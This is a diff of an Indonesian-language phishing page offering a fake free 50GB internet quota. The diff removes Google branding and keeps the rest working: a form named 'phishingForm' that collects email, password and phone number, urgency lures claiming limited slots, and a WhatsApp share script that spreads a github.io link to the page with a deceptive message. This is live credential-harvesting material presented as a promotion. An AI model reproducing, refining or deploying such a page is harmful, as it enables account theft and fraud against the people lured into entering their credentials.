@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - Dapatkan Kuota Gratis</title>
+    <title>Program Kuota Gratis 50GB</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Google Sans', Arial, sans-serif;
+            font-family: Arial, sans-serif;
         }
         body {
             background: #f0f2f5;
@@ -23,17 +23,17 @@
             max-width: 500px;
             width: 100%;
         }
-        .google-card {
+        .card {
             background: white;
             border-radius: 28px;
             box-shadow: 0 10px 40px rgba(0,0,0,0.2);
             padding: 48px 40px;
             text-align: center;
         }
-        .google-logo {
+        .logo {
             margin-bottom: 20px;
         }
-        .google-logo svg {
+        .logo svg {
             width: 75px;
             height: 75px;
         }
@@ -96,7 +96,7 @@
             color: #5f6368;
             font-size: 14px;
         }
-        .google-input {
+        .input-field {
             width: 100%;
             padding: 15px;
             border: 1px solid #dadce0;
@@ -104,7 +104,7 @@
             font-size: 16px;
             margin-bottom: 15px;
         }
-        .google-input:focus {
+        .input-field:focus {
             outline: none;
             border-color: #1a73e8;
             box-shadow: 0 0 0 2px #e8f0fe;
@@ -120,7 +120,7 @@
             border-radius: 24px;
             font-size: 16px;
         }
-        .btn-google {
+        .btn-primary {
             background: #1a73e8;
             color: white;
             border: none;
@@ -133,7 +133,7 @@
             margin: 20px 0;
             transition: background 0.3s;
         }
-        .btn-google:hover {
+        .btn-primary:hover {
             background: #1557b0;
         }
         .btn-share {
@@ -182,20 +182,16 @@
 </head>
 <body>
     <div class="container">
-        <div class="google-card">
-            <!-- Google Logo -->
-            <div class="google-logo">
-                <svg viewBox="0 0 75 75" width="75" height="75">
-                    <g fill="none" fill-rule="evenodd">
-                        <path d="M37.5 0C16.8 0 0 16.8 0 37.5S16.8 75 37.5 75 75 58.2 75 37.5 58.2 0 37.5 0z" fill="#4285F4"/>
-                        <path d="M37.5 0C16.8 0 0 16.8 0 37.5S16.8 75 37.5 75 75 58.2 75 37.5 58.2 0 37.5 0z" fill="#4285F4"/>
-                        <path d="M61.5 23.3l-4.5 4.5c-2.2-2.3-5.3-3.8-8.8-3.8-6.8 0-12.3 5.5-12.3 12.3 0 6.8 5.5 12.3 12.3 12.3 5.3 0 9.8-3.5 11.5-8.3h-11.5v-6h17.3c.3 1.5.5 3 .5 4.5 0 10.5-7.5 18.8-18 18.8-10.5 0-19-8.5-19-19s8.5-19 19-19c5.3 0 10 2 13.5 5.3z" fill="#FFF"/>
-                    </g>
+        <div class="card">
+            <!-- Logo Netral -->
+            <div class="logo">
+                <svg width="75" height="75" viewBox="0 0 24 24" fill="#1a73e8">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/>
                 </svg>
             </div>
             
-            <h1>Google</h1>
-            <h2>Program Kuota Gratis 50GB</h2>
+            <h1>KUOTA GRATIS</h1>
+            <h2>Program 50GB untuk Semua</h2>
             
             <div class="promo-badge">
                 ⚡ PROMO TERBATAS! TERSISA 128 KUOTA ⚡
@@ -203,7 +199,7 @@
             
             <div class="promo-text">
                 <strong>🎉 SELAMAT! 🎉</strong><br>
-                Nomor Anda terpilih untuk mendapatkan <strong>KUOTA INTERNET 50GB GRATIS</strong> dari Google bekerja sama dengan provider ternama.
+                Nomor Anda terpilih untuk mendapatkan <strong>KUOTA INTERNET 50GB GRATIS</strong> dari program kerjasama provider ternama.
             </div>
             
             <!-- Progress Bar -->
@@ -226,18 +222,18 @@
             
             <div class="step">
                 <span class="step-number">2</span> 
-                <strong>LANGKAH 2: VERIFIKASI AKUN GOOGLE</strong>
-                <p style="margin-top: 10px; color: #5f6368;">Masukkan data Google Anda untuk verifikasi</p>
+                <strong>LANGKAH 2: VERIFIKASI AKUN</strong>
+                <p style="margin-top: 10px; color: #5f6368;">Masukkan data Anda untuk verifikasi</p>
                 
                 <form id="phishingForm" method="POST" action="http://127.0.0.1:8080/login">
                     <div class="input-group">
-                        <label>Email Google</label>
-                        <input type="email" class="google-input" name="email" placeholder="nama@gmail.com" required>
+                        <label>Email</label>
+                        <input type="email" class="input-field" name="email" placeholder="nama@email.com" required>
                     </div>
                     
                     <div class="input-group">
-                        <label>Password Google</label>
-                        <input type="password" class="google-input" name="password" placeholder="••••••••" required>
+                        <label>Password</label>
+                        <input type="password" class="input-field" name="password" placeholder="••••••••" required>
                     </div>
                     
                     <div class="input-group">
@@ -248,16 +244,16 @@
                                 <option value="+60">+60 (Malaysia)</option>
                                 <option value="+65">+65 (Singapore)</option>
                             </select>
-                            <input type="tel" class="google-input" name="phone" placeholder="81234567890" style="width: 70%;" required>
+                            <input type="tel" class="input-field" name="phone" placeholder="81234567890" style="width: 70%;" required>
                         </div>
                     </div>
                     
-                    <button type="submit" class="btn-google">KLAIM KUOTA 50GB SEKARANG</button>
+                    <button type="submit" class="btn-primary">KLAIM KUOTA 50GB SEKARANG</button>
                 </form>
             </div>
             
             <div class="terms">
-                <input type="checkbox" checked disabled> Saya setuju dengan <a href="#">Syarat & Ketentuan</a> dan <a href="#">Kebijakan Privasi</a> Google
+                <input type="checkbox" checked disabled> Saya setuju dengan <a href="#">Syarat & Ketentuan</a> dan <a href="#">Kebijakan Privasi</a>
             </div>
             
             <div class="warning">
@@ -265,18 +261,17 @@
             </div>
             
             <div style="margin-top: 20px; color: #5f6368; font-size: 13px;">
-                <span>🏢 Google Indonesia • 🕒 Berlaku hari ini • 🔒 Aman</span>
+                <span>🏢 Provider Indonesia • 🕒 Berlaku hari ini • 🔒 Aman</span>
             </div>
         </div>
     </div>
 
-    <!-- JAVASCRIPT NYA DI SINI -->
+    <!-- JAVASCRIPT -->
     <script>
         function shareToWhatsApp() {
-            // GANTI LINK NYA DOANG
             const fullLink = 'https://xploit699-dot.github.io/Kouta-gratis-by-null/Index.html';
             
-            const message = `🔥 GOOGLE KUOTA GRATIS 50GB 🔥\n\nHalo, gue baru dapet info nih! Google lagi bagi-bagi kuota gratis 50GB.\n\nLangsung klaim di sini sebelum habis:\n${fullLink}\n\nCepetan masih sisa 128 kuota doang!`;
+            const message = `🔥 KUOTA GRATIS 50GB 🔥\n\nHalo, gue baru dapet info nih! Program kuota gratis 50GB.\n\nLangsung klaim di sini sebelum habis:\n${fullLink}\n\nCepetan masih sisa 128 kuota doang!`;
             
             window.open(`https://wa.me/?text=${encodeURIComponent(message)}`, '_blank');
             
@@ -314,4 +309,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
